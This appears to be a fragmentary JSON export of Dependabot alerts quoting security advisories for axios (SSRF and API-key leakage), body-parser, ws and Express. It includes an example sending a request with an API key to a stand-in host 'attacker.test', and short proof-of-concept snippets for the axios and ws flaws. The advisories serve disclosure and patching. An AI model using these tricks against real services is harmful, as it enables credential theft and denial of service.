Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.","severity":"high","identifiers":[{"value":"GHSA-jr5f-v2jv-69x6","type":"GHSA"},{"value":"CVE-2025-27152","type":"CVE"}],"references":[{"url":"https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6"},{"url":"https://github.com/axios/axios/issues/6463"},{"url":"https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f"},{"url":"https://github.com/axios/axios/releases/tag/v1.8.2"},{"url":"https://nvd.nist.gov/vuln/detail/CVE-2025-27152"},{"url":"https://github.com/advisories/GHSA-jr5f-v2jv-69x6"}],"published_at":"2025-03-07T15:16:00Z","updated_at":"2025-03-07T19:16:41Z","withdrawn_at":null,"vulnerabilities":[{"package":{"ecosystem":"npm","name":"axios"},"severity":"high","vulnerable_version_range":"< 1.8.2","first_patched_version":{"identifier":"1.8.2"}}],"cvss_severities":{"cvss_v3":{"vector_string":null,"score":0.0},"cvss_v4":{"vector_string":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P","score":7.7}},"epss":{"percentage":0.00052,"percentile":0.12996},"cvss":{"vector_string":null,"score":0.0},"cwes":[{"cwe_id":"CWE-918","name":"Server-Side Request Forgery (SSRF)"}]},"security_vulnerability":{"package":{"ecosystem":"npm","name":"axios"},"severity":"high","vulnerable_version_range":"< 1.8.2","first_patched_version":{"identifier":"1.8.2"}},"url":"https://api.github.com/repos/DevOps-ManiInspire/swift/dependabot/alerts/69","html_url":"https://github.com/DevOps-ManiInspire/swift/security/dependabot/69","created_at":"2025-03-19T13:38:20Z","updated_at":"2025-03-19T13:44:08Z","dismissed_at":null,"dismissed_by":null,"dismissed_reason":null,"dismissed_comment":null,"fixed_at":"2025-03-19T13:44:08Z","auto_dismissed_at":null},{"number":68,"state":"fixed","dependency":{"package":{"ecosystem":"npm","name":"body-parser"},"manifest_path":"package.json","scope":"runtime","relationship":"direct"},"security_advisory":{"ghsa_id":"GHSA-qwcr-r2fm-qrc7","cve_id":"CVE-2024-45590","summary":"body-parser vulnerable to denial of service when url encoding is enabled","description":"### Impact\n\nbody-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled.

Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.\n2. Set `server.maxHeadersCount` to `0` so that no limit is applied.\n\n### Credits\n\nThe vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in

in Sec-Websocket-Protocol header","description":"### Impact\n\nA specially crafted value of the `Sec-Websocket-Protocol` header can be used to significantly slow down a ws server.\n\n### Proof of concept\n\n```js\nfor (const length of [1000, 2000, 4000, 8000, 16000, 32000]) {\n  const value = 'b' + ' '.repeat(length) + 'x';\n  const start = process.hrtime.bigint();\n\n  value.trim().split(/ *,

(https://github.com/websockets/ws/commit/00c425ec77993773d823f018f64a5c44e17023ff) and backported to ws@6.2.2 (https://github.com/websockets/ws/commit/78c676d2a1acefbc05292e9f7ea0a9457704bf1b) and

allowed length of the request headers using the [`--max-http-header-size=size`](https://nodejs.org/api/cli.html#cli_max_http_header_size_size) and/or the [`maxHeaderSize`](https://nodejs.org/api/http.html#http_http_createserver_options_requestlistener) options.\n\n### Credits\n\nThe vulnerability was responsibly disclosed along with a fix in private by

This can cause malformed URLs to be evaluated in unexpected ways by common redirect allow list implementations in Express applications, leading to an Open Redirect via bypass of a properly implemented allow list.\n\nThe main method impacted is `res.location()` but this is also called from within `res.redirect()`.\n\n### Patches\n\nhttps://github.com/expressjs/express/commit/0867302ddbde0e9463d0564fea5861feb708c2dd\nhttps://github.com/expressjs/express/commit/0b746953c4bd8e377123527db11f9cd866e39f94\n\nAn initial fix went out with `express@4.19.0`, we then patched a feature regression in `4.19.1` and added improved handling for the bypass in `4.19.2`.\n\n### Workarounds\n\nThe fix for this involves pre-parsing the url string with either `require('node:url').parse` or `new URL`. These are steps you can take on your own before passing the user input string to `res.location` or `res.redirect`.\n\n###
